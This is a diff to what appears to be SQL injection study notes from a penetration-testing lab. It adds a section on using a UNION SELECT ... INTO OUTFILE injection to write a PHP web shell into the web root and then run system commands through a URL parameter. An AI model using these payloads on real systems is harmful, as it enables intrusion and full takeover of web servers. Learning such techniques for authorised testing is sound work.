@@ -455,3 +455,21 @@ cn' union select 1, "file written successfully", 3, 4 into outfile '/var/www/htm
 ```sql
 cn' union select "", "file written successfully", "", "" into outfile 'var/www/html/proof.txt'-- 
 ```
+
+## Writing a web shell
+We can use `OUTFILE` to write a webshell to the web directory
+ExampLe Shell:
+```php
+<?php system($_REQUEST[0]); ?>
+```
+
+Example injection to write our chell
+```sql
+cn' UNION SELECT "", '<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- 
+```
+
+Now we can verify by browing to shell.php and using the shell parameter:
+```url
+http://serverip:port/shell.php?0=id
+# The output of `id` confirms our shell is working
+```
